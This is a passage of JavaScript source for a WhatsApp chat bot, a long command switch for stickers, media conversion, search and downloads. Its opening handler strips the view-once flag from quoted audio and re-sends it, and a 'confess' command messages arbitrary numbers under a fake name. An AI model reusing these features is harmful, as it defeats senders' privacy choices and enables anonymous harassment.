            await VeranBotInc.sendMessage(m.chat, { forward: m.quoted }, { quoted: m });
        } 
        // Check if the quoted message is a view-once audio message
        else if (m.quoted.msg?.message?.audioMessage?.viewOnce) {
            m.quoted.msg.message.audioMessage.viewOnce = false;
            m.quoted.msg.message.audioMessage.contextInfo = { 
                forwardingScore: 1, 
                isForwarded: true, 
                mentionedJid: [m.sender] 
            };
            await VeranBotInc.relayMessage(m.chat, m.quoted.msg.message, {});
        } 
        else {
            replygcveran(`The message is not a view-once message.\nExample: ${prefix + command}`);
        }
    } catch (err) {
        console.error(err);
        replygcveran('An error occurred while processing the view-once message.');
    }
}
break;
			case 'inspect': {
				if (!text) return replygcveran('Enter Group Link!')
				let code = q.match(/chat.whatsapp.com\/([\w\d]*)/g);
				if (code === null) return replygcveran('No invite url detected.');
				code = code[0].replace('chat.whatsapp.com/', '');
				await VeranBotInc.groupGetInviteInfo(code).then(anu => {
					let { id, subject, owner, subjectOwner, creation, desc, descId, participants, size, descOwner } = anu
					console.log(anu);
					let par = `*Gc Name* : ${subject}\n*ID* : ${id}\n${owner ? `*Creator* : @${owner.split('@')[0]}` : '*Creator* : -'}\n*Number of Members* : ${size}\n*Gc Created Date* : ${new Date(creation * 1000).toLocaleString()}\n*DescID* : ${descId ? descId : '-'}\n${subjectOwner ? `*GC Name Changed By* : @${subjectOwner.split('@')[0]}` : '*GC Name Changed By* : -'}\n${descOwner ? `*Desc changed by* : @${descOwner.split('@')[0]}` : '*Desc changed by* : -'}\n\n*Desc* : ${desc ? desc : '-'}\n`;
					VeranBotInc.sendTextMentions(m.chat, par, m);
				}).catch((res) => {
					if (res.data == 406) return replygcveran('Group Not Found❗');
					if (res.data == 410) return replygcveran('Group URL Has Been Reset❗');
				});
			}
			break
			case 'q': case 'quoted': {
				if (!m.quoted) return replygcveran('Reply the message!')
				const anu = await m.getQuotedObj()
				if (!anu) return replygcveran('Format Not Available!')
				if (!anu.quoted) return replygcveran('The Message You Reply Does Not Contain a Reply')
				await VeranBotInc.relayMessage(m.chat, { [anu.quoted.type]: anu.quoted.msg }, {})
			}
			break
			case 'confes': case 'confess': case 'menfes': case 'menfess': {
				if (m.isGroup) return VeranStickPrivate();
				if (game.menfes[m.sender]) return replygcveran(`You're In Session ${command}!`)
				if (!text) return replygcveran(`Example : ${prefix + command} 234xxxx|Fake name`)
				let [teks1, teks2] = text.split`|`
				if (!isNaN(teks1) && !teks1.startsWith('0') && teks1) {
					const tujuan = teks1.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
					const onWa = await VeranBotInc.onWhatsApp(tujuan)
					if (!onWa.length > 0) return replygcveran('This number is not registered on WhatsApp!')
					game.menfes[m.sender] = {
						tujuan: tujuan,
						nama: teks2,
						waktu: setTimeout(() => {
							if (game.menfes[m.sender]) replygcveran(`_Time ${command} finished_`)
							delete game.menfes[m.sender];
						}, 600000)
					};
					game.menfes[tujuan] = {
						tujuan: m.sender,
						nama: 'Recipient',
						waktu: setTimeout(() => {
							if (game.menfes[tujuan]) VeranBotInc.sendMessage(tujuan, { text: `_Time ${command} finished_` });
							delete game.menfes[tujuan];
						}, 600000)
					};
					VeranBotInc.sendMessage(tujuan, { text: `_${command} connected_\n*Note :* if you want to end, type _*${prefix}del${command}*_` });
					replygcveran(`_Start ${command}..._\n*Please start sending messages/media*\n*Duration ${command} only for 10 minutes*\n*Note :* if you want to end, type _*${prefix}del${command}*_`)
				} else {
					replygcveran(`Enter the number!\nExample : ${prefix + command} 234xxxx|Fake name`)
				}
			}
			break
			case 'delconfes': case 'delconfess': case 'delmenfes': case 'delmenfess': {
				if (!game.menfes[m.sender]) return replygcveran(`You Are Not In ${command.split('del')[1]} session!`)
				let anu = game.menfes[m.sender]
				VeranBotInc.sendMessage(anu.tujuan, { text: `Chat Ended By ${anu.nama ? anu.nama : 'Somebody'}` })
				replygcveran(`Successfully Ends Session ${command.split('del')[1]}!`)
				delete game.menfes[anu.tujuan];
				delete game.menfes[m.sender];
			}
			break
			
			// Tools Menu
			case 'fetch': case 'get': {
				if (!text.startsWith('http')) return replygcveran(`No Query?\n\nExample : ${prefix + command} https://google.com`)
				try {
					const res = await axios.get(isUrl(text) ? isUrl(text)[0] : text)
					if (!/json|html|plain/.test(res.headers['content-type'])) {
						await replygcveran(text)
					} else {
						replygcveran(util.format(res.data))
					}
				} catch (e) {
					replygcveran(util.format(e))
				}
			}
			break
			case 'toaud': case 'toaudio': {
				if (!/video/.test(mime) && !/audio/.test(mime)) return replygcveran(`Send/Reply Video/Audio that you want to make into audio with captions ${prefix + command}`)
				VeranStickWait()
				let media = await (m.quoted ? m.quoted.download() : m.download())
				let audio = await toAudio(media, 'mp4')
				await VeranBotInc.sendMessage(m.chat, { audio: audio, mimetype: 'audio/mpeg'}, { quoted : m })
			}
			break
			case 'tomp3': {
				if (!/video/.test(mime) && !/audio/.test(mime)) return replygcveran(`Send/Reply Video/Audio that you want to make into audio with captions ${prefix + command}`)
				VeranStickWait()
				let media = await (m.quoted ? m.quoted.download() : m.download())
				let audio = await toAudio(media, 'mp4')
				await VeranBotInc.sendMessage(m.chat, { document: audio, mimetype: 'audio/mpeg', fileName: `dgveran.mp3`}, { quoted : m })
			}
			break
			case 'tovn': case 'toptt': case 'tovoice': {
				if (!/video/.test(mime) && !/audio/.test(mime)) return replygcveran(`Send/Reply Video/Audio that you want to make into audio with captions ${prefix + command}`)
				VeranStickWait()
				let media = await (m.quoted ? m.quoted.download() : m.download())
				let audio = await toPTT(media, 'mp4')
				await VeranBotInc.sendMessage(m.chat, { audio: audio, mimetype: 'audio/ogg; codecs=opus', ptt: true }, { quoted: m })
			}
			break
			case 'togif': {
				if (!/webp/.test(mime) && !/video/.test(mime)) return replygcveran(`Reply Video/Sticker with caption *${prefix + command}*`)
				VeranStickWait()
				let { webp2mp4File } = require('./lib/uploader')
				let media = await VeranBotInc.downloadAndSaveMediaMessage(qmsg)
				let webpToMp4 = await webp2mp4File(media)
				await VeranBotInc.sendMessage(m.chat, { video: { url: webpToMp4.result, caption: 'Convert Webp To Video' }, gifPlayback: true }, { quoted: m })
				await fs.unlinkSync(media)
			}
			break
			case 'tovideo': case 'tomp4': {
				if (!/webp/.test(mime) && !/video/.test(mime)) return replygcveran(`Reply Video/Sticker with caption *${prefix + command}*`)
				VeranStickWait()
				let { webp2mp4File } = require('./lib/uploader')
				let media = await VeranBotInc.downloadAndSaveMediaMessage(qmsg)
				let webpToMp4 = await webp2mp4File(media)
				await VeranBotInc.sendMessage(m.chat, { video: { url: webpToMp4.result }, caption: 'Convert Webp To Video' }, { quoted: m })
				await fs.unlinkSync(media)
			}
			break
			case 'toimage': case 'toimg': {
				if (!/webp/.test(mime)) return replygcveran(`Reply Video/Sticker with caption *${prefix + command}*`)
				VeranStickWait()
				let media = await VeranBotInc.downloadAndSaveMediaMessage(qmsg)
				let ran = await getRandom('.png')
				exec(`ffmpeg -i ${media} ${ran}`, (err) => {
					fs.unlinkSync(media)
					if (err) return replygcveran('Fail❗')
					let buffer = fs.readFileSync(ran)
					VeranBotInc.sendMessage(m.chat, { image: buffer }, { quoted: m })
					fs.unlinkSync(ran)
				})
			}
			break
			case 'toptv': {
				if (!/video/.test(mime)) return replygcveran(`Send/Reply the video you want to use as a PTV message with caption ${prefix + command}`)
				if ((m.quoted ? m.quoted.type : m.type) === 'videoMessage') {
					const anu = await (m.quoted ? m.quoted.download() : m.download())
					const msg = await generateWAMessageContent({ video: anu }, { upload: VeranBotInc.waUploadToServer })
					await VeranBotInc.relayMessage(m.chat, { ptvMessage: msg.videoMessage }, {})
				} else {
					replygcveran('Reply Videos You Want to Convert to PTV Messages!')
				}
			}
			break
			case 'url': case 'tourl': {
				let { fileIO, TelegraPh } = require('./lib/uploader')
				if (/jpg|jpeg|png/.test(mime)) {
					VeranStickWait()
					let media = await (m.quoted ? m.quoted.download() : m.download())
					let anu = await TelegraPh(media)
					replygcveran('Url : ' + anu)
				} else if (/webp|video|sticker|audio/.test(mime)) {
					VeranStickWait()
					let media = await (m.quoted ? m.quoted.download() : m.download())
					let anu = await UploadFileUgu(media)
					replygcveran('Url : ' + anu.url)
				} else {
					replygcveran('Send the media you want to upload!')
				}
			}
			break
			case 'texttospeech-indo': case 'tts-indo': case 'ttsindo': {
				if (!text) return replygcveran('Where is the text you want to convert to audio??')
				let { tts } = require('./lib/tts')
				let anu = await tts(text)
				VeranBotInc.sendMessage(m.chat, { audio: anu, ptt: true, mimetype: 'audio/mpeg' }, { quoted: m })
			}
			break
			case 'say': case 'tts': case 'trt':{
if (!text) return replygcveran('Where is the text?')
            let texttts = text
            const veranrl = googleTTS.getAudioUrl(texttts, {
                lang: "en",
                slow: false,
                host: "https://translate.google.com",
            })
            return VeranBotInc.sendMessage(m.chat, {
                audio: {
                    url: veranrl,
                },
                mimetype: 'audio/mp4',
                ptt: true,
                fileName: `${text}.mp3`
            }, {
                quoted: m,
            })
        }
        break
			case 'toqr': case 'qr': {
				if (!text) return replygcveran(`Please include a text or link\n\nFor Example:\n*${prefix + command}* wassup`)
				VeranStickWait()
				await VeranBotInc.sendMessage(m.chat, { image: { url: 'https://api.qrserver.com/v1/create-qr-code/?size=1000x1000&data=' + text }, caption: 'Here you go!' }, { quoted: m })
			}
			break
			case 'ssweb': {
				if (!text) return replygcveran(`Example: ${prefix + command} https://github.com/Veran350/VERAN-TECH-BOT-`)
				if (!text.startsWith('http')) {
					let buf = 'https://image.thum.io/get/width/1900/crop/1000/fullpage/https://' + q;
					await VeranBotInc.sendMessage(m.chat, { image: { url: buf }, caption: 'Done' }, { quoted: m })
				} else {
					let buf = 'https://image.thum.io/get/width/1900/crop/1000/fullpage/' + q;
					await VeranBotInc.sendMessage(m.chat, { image: { url: buf }, caption: 'Done' }, { quoted: m })
				}
			}
			break
			case'smeta': {
if (!/webp/.test(mime)) return replygcveran('Reply sticker!')
  var stiker = false
    try {
        let [packname, ...author] = q.split('|')
            //var author = (author  []).join('|')
                let mime = m.quoted.mimetype || ''
                        //let img = await q.download()
                            let img = await VeranBotInc.downloadAndSaveMediaMessage(quoted, makeid(5))
                                if (!img) return replygcveran('Reply a sticker!')
                                    var stiker = await addExifAvatar(img, `Made by`, `Veran Bot`)
                                      } catch (e) {
                                          console.error(e)
                                              if (Buffer.isBuffer(e)) stiker = e
                                                } finally {
                                                    if (stiker) VeranBotInc.sendMessage(m.chat, {
                                                          sticker: stiker
                                                              }, {
                                                                    quoted: m
                                                                        })
                                                                            else return replygcveran('reply sticker')
                                                                              }
                                                                              }       
                                                                              break
			case 's': case 'sticker': case 'stiker': {
if (!quoted) return replygcveran(`Send/Reply Images/Videos/Gifs With Captions ${prefix+command}\nVideo Duration 1-9 Seconds`)
if (/image/.test(mime)) {
let media = await quoted.download()
let encmedia = await VeranBotInc.sendImageAsSticker(m.chat, media, m, { packname: global.packname, author: global.author })
} else if (/video/.test(mime)) {
if ((quoted.msg || quoted).seconds > 11) return replygcveran('Send/Reply Images/Videos/Gifs With Captions ${prefix+command}\nVideo Duration 1-9 Seconds')
let media = await quoted.download()
let encmedia = await VeranBotInc.sendVideoAsSticker(m.chat, media, m, { packname: global.packname, author: global.author })
} else {
replygcveran(`Send/Reply Images/Videos/Gifs With Captions ${prefix+command}\nVideo Duration 1-9 Seconds`)
}
}
break

case 'swm': case 'steal': case 'stickerwm': case 'take':{
if (!args.join(" ")) return replygcveran(`Where is the text?`)
const swn = args.join(" ")
const pcknm = swn.split("|")[0]
const atnm = swn.split("|")[1]
if (m.quoted.isAnimated === true) {
VeranBotInc.downloadAndSaveMediaMessage(quoted, "gifee")
VeranBotInc.sendMessage(m.chat, {sticker:fs.readFileSync("gifee.webp")}, m, { packname: pcknm, author: atnm })
} else if (/image/.test(mime)) {
let media = await quoted.download()
let encmedia = await VeranBotInc.sendImageAsSticker(m.chat, media, m, { packname: pcknm, author: atnm })
} else if (/video/.test(mime)) {
if ((quoted.msg || quoted).seconds > 11) return replygcveran('Maximum 10 Seconds!')
let media = await quoted.download()
let encmedia = await VeranBotInc.sendVideoAsSticker(m.chat, media, m, { packname: pcknm, author: atnm })
} else {
replygcveran(`Photo/Video?`)
}
}
break
			case 'smeme': case 'stickermeme': case 'stickmeme': {
if (!/webp/.test(mime) && /image/.test(mime)) {
if (!text) return replygcveran(`Usage: ${prefix + command} text1|text2`)
let { TelegraPh } = require('./lib/uploader')
atas = text.split('|')[0] ? text.split('|')[0] : '-'
bawah = text.split('|')[1] ? text.split('|')[1] : '-'
mee = await VeranBotInc.downloadAndSaveMediaMessage(quoted)
mem = await TelegraPh(mee)
meme = `https://api.memegen.link/images/custom/${encodeURIComponent(atas)}/${encodeURIComponent(bawah)}.png?background=${mem}`
memek = await VeranBotInc.sendImageAsSticker(m.chat, meme, m, { packname: global.packname, author: global.author })
} else {
replygcveran(`Send/reply image with caption ${prefix + command} text1|text2`)
}
}
break
			case 'write': {
				replygcveran(`*Example*\n${prefix}writeleft text\n${prefix}writeright text\n${prefix}folioleft text\n${prefix}folioright text`)
			}
			break
			case 'writeleft': {
				if (!text) return replygcveran(`Send command *${prefix + command}* text`)
				VeranStickWait()
				const splitText = text.replace(/(\S+\s*){1,9}/g, '$&\n')
				const fixHeight = splitText.split('\n').slice(0, 31).join('\n')
				spawn('convert', [
					'./src/write/images/book/beforeleft.jpg',
					'-font',
					'./src/write/font/Indie-Flower.ttf',
					'-size',
					'960x1280',
					'-pointsize',
					'23',
					'-interline-spacing',
					'2',
					'-annotate',
					'+140+153',
					fixHeight,
					'./src/write/images/book/afterleft.jpg'
				])
				.on('error', () => replygcveran(mess.error))
				.on('exit', () => {
					VeranBotInc.sendMessage(m.chat, { image: fs.readFileSync('./src/write/images/book/afterleft.jpg'), caption: 'Here you go!' }, { quoted: m })
				})
			}
			break
			case 'writeright': {
				if (!text) return replygcveran(`Send command *${prefix + command}* text`)
				VeranStickWait()
				const splitText = text.replace(/(\S+\s*){1,9}/g, '$&\n')
				const fixHeight = splitText.split('\n').slice(0, 31).join('\n')
				spawn('convert', [
					'./src/write/images/book/beforeright.jpg',
					'-font',
					'./src/write/font/Indie-Flower.ttf',
					'-size',
					'960x1280',
					'-pointsize',
					'23',
					'-interline-spacing',
					'2',
					'-annotate',
					'+128+129',
					fixHeight,
					'./src/write/images/book/afterright.jpg'
				])
				.on('error', () => replygcveran(mess.error))
				.on('exit', () => {
					VeranBotInc.sendMessage(m.chat, { image: fs.readFileSync('./src/write/images/book/afterright.jpg'), caption: 'Here you go!' }, { quoted: m })
				})
			}
			break
			case 'folioleft': {
				if (!text) return replygcveran(`Send command *${prefix + command}* text`)
				VeranStickWait()
				const splitText = text.replace(/(\S+\s*){1,9}/g, '$&\n')
				const fixHeight = splitText.split('\n').slice(0, 38).join('\n')
				spawn('convert', [
					'./src/write/images/folio/beforeleft.jpg',
					'-font',
					'./src/write/font/Indie-Flower.ttf',
					'-size',
					'1720x1280',
					'-pointsize',
					'23',
					'-interline-spacing',
					'4',
					'-annotate',
					'+48+185',
					fixHeight,
					'./src/write/images/folio/afterleft.jpg'
				])
				.on('error', () => replygcveran(mess.error))
				.on('exit', () => {
					VeranBotInc.sendMessage(m.chat, { image: fs.readFileSync('./src/write/images/folio/afterleft.jpg'), caption: 'Here you go!' }, { quoted: m })
				})
			}
			break
			case 'folioright': {
				if (!text) return replygcveran(`Send command *${prefix + command}* text`)
				VeranStickWait()
				const splitText = text.replace(/(\S+\s*){1,9}/g, '$&\n')
				const fixHeight = splitText.split('\n').slice(0, 38).join('\n')
				spawn('convert', [
					'./src/write/images/folio/beforeright.jpg',
					'-font',
					'./src/write/font/Indie-Flower.ttf',
					'-size',
					'1720x1280',
					'-pointsize',
					'23',
					'-interline-spacing',
					'4',
					'-annotate',
					'+89+190',
					fixHeight,
					'./src/write/images/folio/afterright.jpg'
				])
				.on('error', () => replygcveran(mess.error))
				.on('exit', () => {
					VeranBotInc.sendMessage(m.chat, { image: fs.readFileSync('./src/write/images/folio/afterright.jpg'), caption: 'Here you go!' }, { quoted: m })
				})
			}
			break
			
			// Ai Menu
			case 'ai2': case 'v-ai': case 'openai2': {
				if (!text) return replygcveran(`Example: ${prefix + command} query`)
				const hasil = await chatGpt(text);
				replygcveran(hasil)
			}
			break


			// Search Menu
			case 'play':  case 'song': {
if (!text) return replygcveran(`Example : ${prefix + command} anime whatsapp status`)
try {
const veranplaymp3 = require('./lib/ytdl')
let yts = require("youtube-yts")
        let search = await yts(text)
        let anup3k = search.videos[0]
const pl= await veranplaymp3.mp3(anup3k.url)
await VeranBotInc.sendMessage(m.chat,{
    audio: fs.readFileSync(pl.path),
    fileName: anup3k.title + '.mp3',
    mimetype: 'audio/mp4', ptt: true,
    contextInfo:{
        externalAdReply:{
            title:anup3k.title,
            body: botname,
            thumbnail: await fetchBuffer(pl.meta.image),
            sourceUrl: websitex,
            mediaType:2,
            mediaUrl:anup3k.url,
        }

    },
},{quoted:m})
await fs.unlinkSync(pl.path)
}catch{
	replygcveran(`Command will not work on Pannel Use ${prefix}spotify,play2,song2,soundcloud or itunes.`)
	}
}
break

//--------------------------------------------------------------------------------------------------//

                
case 'play2':  
case 'song2': {
  try {
    if (!text) return replygcveran(`Example : ${prefix + command} anime whatsapp status`);
    const veranplaymp3 = require('./lib/ytdl2');
    let yts = require("youtube-yts");
    let search = await yts(text);

    if (!search || search.videos.length === 0) throw new Error("No videos found for the search query");

    let anup3k = search.videos[0];
    const pl = await veranplaymp3.mp3(anup3k.url);
    
    if (!pl || !pl.path) throw new Error("Failed to retrieve mp3 file");

    await VeranBotInc.sendMessage(m.chat, {
      audio: fs.readFileSync(pl.path),
      fileName: anup3k.title + '.mp3',
      mimetype: 'audio/mp4', 
      ptt: true,
      contextInfo: {
        externalAdReply: {
          title: anup3k.title,
          body: botname,
          thumbnail: await fetchBuffer(pl.meta.image),
          mediaType: 2,
          mediaUrl: anup3k.url,
        }
      },
    }, {quoted: m});

    await fs.unlinkSync(pl.path);
  } catch (error) {
    console.error("Error in play2/song2 command: ", error);
    replygcveran("An error occurred while processing your request.");
  }
}
break;

case 'ytvideo': {
  try {
    // Check if the user has provided a valid URL
    if (args.length < 1 || !isUrl(text)) 
      return replygcveran(`Where is the link??\n\nExample: ${prefix + command} https://youtube.com/watch?v=PtFMh6Tccag`);

    // API URL to fetch video information
    const apiUrl = `https://bk9.fun/download/youtube?url=${encodeURIComponent(text)}`;
    
    // Fetch the response from the API
    let res = await fetch(apiUrl);
    let apiResponse = await res.json();
    
    // Check if the API returned a valid response
    if (!apiResponse.status || !apiResponse.BK9 || !apiResponse.BK9.video) 
      throw new Error("Failed to retrieve video");

    // Extract video data from the API response
    let { title, thumb, channel, published, views, url } = apiResponse.BK9.video;

    // Build the caption with more details
    const ytc = `
      *🎬 Title:* ${title}
      *📅 Published:* ${published}
      *🕒 Duration:*  -- (Duration info not provided by API)
      *👀 Views:* ${views}
      *📺 Channel:* ${channel}
    `.trim();

    // Notify the user that the download is starting
    replygcveran("⏳ *Downloading video, please wait...*");

    // Send the video along with the caption
    await VeranBotInc.sendMessage(m.chat, {
      video: { url: url },
      caption: ytc,
      thumbnail: { url: thumb }
    }, { quoted: m });

    // Notify that the download is complete
    replygcveran(`✅ *Download complete!* 🎉\n\n${ytc}`);

  } catch (error) {
    console.error("Error in ytvideo command: ", error);
    replygcveran("❌ *An error occurred while processing your request. Please try again later.*");
  }
}
break;

				
                

case 'searchsoundcloud': case 'ssc': {
  if (!text) return replygcveran(`*• Example:* ${prefix + command} metamorphosis`);

  const fetchSoundCloudResults = async (query) => {
    const apiUrl = `https://bk9.fun/search/soundcloud?q=${encodeURIComponent(query)}`;

    try {
      const response = await fetch(apiUrl);
      if (!response.ok) {
        console.error(`API response not OK: ${response.status} ${response.statusText}`);
        throw new Error('API response not OK');
      }
      const json = await response.json();
      if (json.status && json.BK9 && json.BK9.length > 0) {
        return json.BK9; // Return results if found
      } else {
        console.error('No results found in API response');
      }
    } catch (error) {
      console.error(`Error fetching from ${apiUrl}:`, error);
    }
    return null; // Return null if no results found
  };

  try {
    await VeranStickWait();
    const query = text.trim();
    const results = await fetchSoundCloudResults(query);

    if (!results) {
      return replygcveran('❌ Failed to fetch SoundCloud results. Please try again.');
    }

    let soundCloudText = `🎵 *SoundCloud Results for* _"${query}"_:\n\n`;
    results.forEach((track, index) => {
      soundCloudText += `🔊 *Title:* ${track.title}\n🔗 *Link:* ${track.link}\n\n`;
    });

    let msgs = generateWAMessageFromContent(m.chat, {
      viewOnceMessage: {
        message: {
          "messageContextInfo": {
            "deviceListMetadata": {},
            "deviceListMetadataVersion": 2
          },
          interactiveMessage: proto.Message.InteractiveMessage.create({
            body: proto.Message.InteractiveMessage.Body.create({
              text: '> SoundCloud Search Results\n\n' + soundCloudText
            }),
            footer: proto.Message.InteractiveMessage.Footer.create({
              text: botname
            }),
            header: proto.Message.InteractiveMessage.Header.create({
              hasMediaAttachment: false,
              ...await prepareWAMessageMedia({ image: fs.readFileSync('./VTHmedia/theme/VthPic.jpg')}, { upload: VeranBotInc.waUploadToServer })
            }),
            nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
              buttons: [{
                "name": "quick_reply",
                "buttonParamsJson": `{\"display_text\":\"🔍 Search More\",\"id\":\"${prefix}searchsoundcloud ${query}\"}`
              }],
            }),
            contextInfo: {
              mentionedJid: [m.sender],
              forwardingScore: 999,
              isForwarded: true,
              forwardedNewsletterMessageInfo: {
                newsletterJid: '100000000000000000@newsletter',
                newsletterName: ownername,
                serverMessageId: 143
              }
            }
          })
        }
      }
    }, { quoted: m });

    await VeranBotInc.relayMessage(m.chat, msgs.message, {});
  } catch (e) {
    return replygcveran("`*Error*`");
  }
}
break;

case 'soundcloud': {
  if (!text) return replygcveran(`*Where is the Song Name?*\n_Example:_\n${prefix}${command} Metamorphosis`);

  try {
    // Construct the API URL with global variables
    const apiUrl = `${global.api}downloader/sound-cloud?apikey=${global.id}&url=${encodeURIComponent(text)}`;
    let api = await fetchJson(apiUrl);

    // Log the API response for debugging
    console.log('SoundCloud API Response:', api);

    if (api.status !== 200 || !api.result) {
      await VeranBotInc.sendMessage(m.chat, '❌ No results found on SoundCloud. Please try again with a different query.', { quoted: m });
      return;
    }

    // Extract download URL
    const downloadUrl = api.result.dl_url;
    if (!downloadUrl) {
      await VeranBotInc.sendMessage(m.chat, '❌ No download link found. Please try again.', { quoted: m });
      return;
    }

    // Log the download URL for debugging
    console.log('Download URL:', downloadUrl);

    // Fetch the audio file
    const audioResponse = await fetch(downloadUrl);
    if (!audioResponse.ok) {
      throw new Error(`Failed to fetch audio. Status: ${audioResponse.status}`);
    }

    const audioBuffer = await audioResponse.buffer();
    if (!audioBuffer || audioBuffer.length === 0) {
      await VeranBotInc.sendMessage(m.chat, '❌ Failed to fetch audio. The file might be empty or inaccessible.', { quoted: m });
      return;
    }

    // Prepare and send the message with audio
    const songInfo = `*🎵 S O U N D C L O U D 🎵*\n\n` +
                     `• 🎵 *Title*: ${api.result.title}\n` +
                     `• ⏱️ *Duration*: ${api.result.duration}\n` +
                     `• 🎵 *Quality*: ${api.result.quality}\n` +
                     `• 🔗 *Download Link*: [Click Here](${downloadUrl})`;

    await VeranBotInc.sendMessage(m.chat, { text: songInfo }, { quoted: m });

    await VeranBotInc.sendMessage(m.chat, {
      audio: { buffer: audioBuffer },
      mimetype: 'audio/mpeg',
      contextInfo: {
        externalAdReply: {
          title: `🎵 - sᴏᴜɴᴅᴄʟᴏᴜᴅ -`,
          body: api.result.title,
          thumbnailUrl: api.result.thumb, // Use the song's thumbnail image
          sourceUrl: downloadUrl, // URL to the download link
          mediaType: 2,
          showAdAttribution: true,
          renderLargerThumbnail: true
        }
      }
    }, { quoted: m });

  } catch (error) {
    console.error('Error fetching SoundCloud data:', error.message);
    await VeranBotInc.sendMessage(m.chat, { text: '❌ An error occurred while fetching the SoundCloud data. Please try again later.' }, { quoted: m });
  }
}
break;





			case 'pixiv': {
				if (!text) return replygcveran(`Example: ${prefix + command} hello`)
				try {
					let { pixivdl } = require('./lib/pixiv')
					let res = await pixivdl(text)
					VeranStickWait()
					for (let i = 0; i < res.media.length; i++) {
						let caption = i == 0 ? `${res.caption}\n\n*By:* ${res.artist}\n*Tags:* ${res.tags.join(', ')}` : ''
						let mime = (await FileType.fromBuffer(res.media[i])).mime 
						await VeranBotInc.sendMessage(m.chat, { [mime.split('/')[0]]: res.media[i], caption, mimetype: mime }, { quoted: m })
					}
				} catch (e) {
					replygcveran('Search Not found!')
				}
			}
			break
			case 'pinterest': case 'pin': {
  if (!text) return replygcveran(`Title?`);
  async function createImage(url) {
    const { imageMessage } = await generateWAMessageContent({
      image: {
        url
      }
    }, {
      upload: VeranBotInc.waUploadToServer
    });
    return imageMessage;
  }

  function shuffleArray(array) {
    for (let i = array.length - 1; i > 0; i--) {
      const j = Math.floor(Math.random() * (i + 1));
      [array[i], array[j]] = [array[j], array[i]];
    }
  }

  let push = [];
  let { data } = await axios.get(`https://www.pinterest.com/resource/BaseSearchResource/get/?source_url=%2Fsearch%2Fpins%2F%3Fq%3D${text}&data=%7B%22options%22%3A%7B%22isPrefetch%22%3Afalse%2C%22query%22%3A%22${text}%22%2C%22scope%22%3A%22pins%22%2C%22no_fetch_context_on_resource%22%3Afalse%7D%2C%22context%22%3A%7B%7D%7D&_=1619980301559`);
  let res = data.resource_response.data.results.map(v => v.images.orig.url);

  shuffleArray(res); // Randomize arrays
  let ult = res.splice(0, 5); // Takes the first 10 images from a randomized array
  let i = 1;
  for (let lucuy of ult) {
    push.push({
      body: proto.Message.InteractiveMessage.Body.fromObject({
        text: `_*Here is the result of: ${text}*_`
      }),
      footer: proto.Message.InteractiveMessage.Footer.fromObject({
        text: botname
      }),
      header: proto.Message.InteractiveMessage.Header.fromObject({
        title: `Image - ${i++}`,
        hasMediaAttachment: true,
        imageMessage: await createImage(lucuy)
      }),
      nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
        buttons: [
          {
            "name": "cta_url",
            "buttonParamsJson": `{"display_text":"Source","url":"https://www.pinterest.com/search/pins/?rs=typed&q=${text}","merchant_url":"https://www.pinterest.com/search/pins/?rs=typed&q=${text}"}`
          }
        ]
      })
    });
  }
  const bot = generateWAMessageFromContent(m.chat, {
    viewOnceMessage: {
      message: {
        messageContextInfo: {
          deviceListMetadata: {},
          deviceListMetadataVersion: 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.fromObject({
          body: proto.Message.InteractiveMessage.Body.create({
            text: mess.done
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: global.namabot
          }),
          header: proto.Message.InteractiveMessage.Header.create({
            hasMediaAttachment: false
          }),
          carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
            cards: [
              ...push
            ]
          })
        })
      }
    }
  }, {quoted:m});
  await VeranBotInc.relayMessage(m.chat, bot.message, {
    messageId: bot.key.id
  });
}
break
			case 'wallpaper': {
                if (!text) return replygcveran('Enter Query Title')
                await VeranStickWait()
		let { wallpaper } = require('./lib/scraper')
                anuwallpep = await wallpaper(text)
                result = anuwallpep[Math.floor(Math.random() * anuwallpep.length)]       
         let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${m.pushName}\n_*Here is the result of ${text}*_\n\n${themeemoji} Title : ${result.title}\n${themeemoji} Category : ${result.type}\n${themeemoji} Detail : ${result.source}\n${themeemoji} Media Url : ${result.image[2] || result.image[1] || result.image[0]}`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: {url: result.image[0]}}, { upload: VeranBotInc.waUploadToServer })
          }), 
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix+command} ${text}"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '100000000000000000@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await VeranBotInc.relayMessage(m.chat, msgs.message, {})                
            }
            break
			case 'ringtone': {
				if (!text) return replygcveran(`Example: ${prefix + command} black rover`)
				let anu = await ringtone(text)
				let result = pickRandom(anu)
				await VeranBotInc.sendMessage(m.chat, { audio: { url: result.audio }, fileName: result.title + '.mp3', mimetype: 'audio/mpeg' }, { quoted: m })
			}
			break
			
			// Downloader Menu
case 'yta': {
    if (!text) return replygcveran(`Example: ${prefix + command} youtube_url`);
    if (!text.includes('youtu')) return replygcveran('The URL does not contain results from YouTube!');
    VeranStickWait();

    try {
        const response = await axios.get(`https://api.giftedtech.my.id/api/download/ytaudio?apikey=gifted&url=${encodeURIComponent(url)}`);
        const toxxic = response.data;

        if (!toxxic.status || !toxxic.result) {
            return replygcveran('Error fetching audio from the URL.');
        }

        await VeranBotInc.sendMessage(m.chat, {
            audio: { url: toxxic.download_url },
            mimetype: 'audio/mpeg'
        }, { quoted: m });
    } catch (error) {
        console.error('Error:', error);
        replygcveran('Failed to fetch audio. Please try again later.');
    }
}
break;

			case 'ytmp4': case 'ytvideo': case 'ytplayvideo': {
  if (!text) {
    await VeranBotInc.sendMessage(m.chat, {
      text: 'Please provide a YouTube link to convert.',
